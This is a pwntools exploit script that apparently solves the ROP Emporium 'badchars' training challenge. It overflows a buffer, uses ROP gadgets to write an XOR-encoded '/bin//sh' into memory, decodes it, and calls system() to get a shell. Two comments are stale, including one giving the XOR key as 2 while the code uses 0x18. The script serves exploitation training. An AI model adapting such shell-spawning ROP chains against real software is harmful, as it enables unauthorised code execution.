#!/usr/bin/python
from pwn import *

elf = context.binary = ELF('badchars')
io = process(elf.path)

# io = gdb.debug(elf.path, '''
#     break *pwnme+233
#     continue
# ''')

# gadgets
xor_r15_r14b = p64(0x0000000000400b30)      # xor byte ptr [r15], r14b; ret;    -> r14b just means lower half of r14's bytes (we use 2, so it doesn't matter)
pop_r14_r15 = p64(0x0000000000400b40)       # pop r14; pop r15; ret;
pop_r12_r13 = p64(0x0000000000400b3b)       # pop r12; pop r13; ret;
mov_qw_r13_r12 = p64(0x0000000000400b34)    # mov qword ptr [r13], r12; ret;
pop_rdi = p64(0x0000000000400b39)           # pop rdi; ret;

# readelf -S badchars
# readelf -x .bss badchars
write_section = p64(0x00601080)
call_sh = "/bin//sh"
# objdump -d write4 | grep system@plt
system_addr = p64(0x4006f0)

def main():
    xored_sh = "7zqv77kp"
    junk = "A" * 40

    payload = junk

    # pop xored_sh and write_section into r12 and r13 respectively, then move it into write_section
    payload += pop_r12_r13
    payload += xored_sh
    payload += write_section
    payload += mov_qw_r13_r12
    
    # xor write_section with 2 (load registers r14 and r15, since that was the only xor we could find)
    # do it character per character, as that's how XOR works
    for i in range(0, len(xored_sh)): 
        payload += pop_r14_r15
        payload += p64(0x18)
        payload += p64(0x00601080 + i)
        payload += xor_r15_r14b
    ##
    
    # pop write_section into rdi and then call system with rdi as parameter
    payload += pop_rdi
    payload += write_section
    payload += system_addr
    
    io.recvuntil("> ")
    # Send the malicious payload
    io.sendline(payload)
    
    io.interactive()
## 

if __name__ == "__main__":
    main()
##
